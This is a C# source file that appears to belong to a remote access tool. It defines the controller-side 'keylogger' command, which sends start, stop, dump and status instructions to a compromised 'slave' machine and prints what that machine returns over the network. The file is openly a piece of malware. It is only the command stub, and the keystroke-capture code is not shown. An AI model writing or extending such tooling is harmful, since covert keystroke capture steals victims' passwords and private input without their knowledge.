using System;
using System.Collections.Generic;
using Master.Commands.Core;

namespace Master.Commands
{
    internal class KeyLogger : IMasterCommand
    {
        public string name { get; } = "keylogger";

        public string description { get; } = "Capture the slave's keystokes. You can see it's status, dump logged keys, start and stop it";

        public bool isLocal { get; } = false;

        public List<string> validArguments { get; } = new List<string>()
        {
            "start",
            "stop",
            "dump",
            "status"
        };


        public void Process(List<string> args)
        {
            if (args.Count != 1)
            {
                return;
            }

            if (args[0] == "status" || args[0] == "dump")
            {
                Console.WriteLine(MasterCommandsManager.networkManager.ReadLine());
            }
        }
    }
}
